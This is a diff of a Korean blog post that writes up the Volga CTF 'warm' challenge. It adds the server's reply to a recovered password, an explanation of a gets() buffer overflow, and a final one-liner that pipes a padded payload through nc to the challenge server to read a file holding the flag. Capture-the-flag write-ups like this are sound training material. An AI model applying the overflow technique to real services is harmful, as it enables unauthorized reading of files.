@@ -1,6 +1,6 @@
 ---
 layout: post
-title: ! "[Volga ctf] warm write up (수정 중)"
+title: ! "[Volga ctf] warm write up"
 excerpt_separator: <!--more-->
 comments : true
 tags:
@@ -70,8 +70,16 @@ print(pw)
 root@ubuntu:/home/ubuntu/study/ctf/warm# python test.py 
 v8&3mqPQebWFqM?x
 ```
+지금은 서버가 닫혀있지만, 위의 값을 입력하면 `Seek file with something more sacred!`라는 문구를 출력해준다. 여기서 `scared`가 힌트가 된다.  
 
-다음 함수를 보면, gets()함수를 사용함으로써, overflow가 발생하는 것을 알 수 있다.
+```
+Hi there! I've been waiting for your password!
+v8&3mqPQebWFqM?x
+Seek file with something more sacred!
+```
+
+우선 다음 함수를 보면, gets()함수를 사용함으로써, overflow가 발생하는 것을 알 수 있다.  
+
 ```c
 int sub_9EC()
 {
@@ -109,6 +117,8 @@ int sub_9EC()
 }
 ```
 
+buffer는 100 bytes로, `v8&3mqPQebWFqM?x` 16 bytes를 포함하여 overflow 시켜준다.  
+
 ```c
 char *__fastcall sub_8F0(char *a1)
 {
@@ -130,4 +140,10 @@ char *__fastcall sub_8F0(char *a1)
     result = strcpy(dest, (const char *)&v4);
   return result;
 }
+```
+
+그리고 마지막에 파일 이름을 써주면 flag를 얻을 수 있게 된다.  
+
+```
+python -c "print('v8&3mqPQebWFqM?x'+'A'*84+'sacred');" | nc warm.q.2019.volgactf.ru 443 
 ```
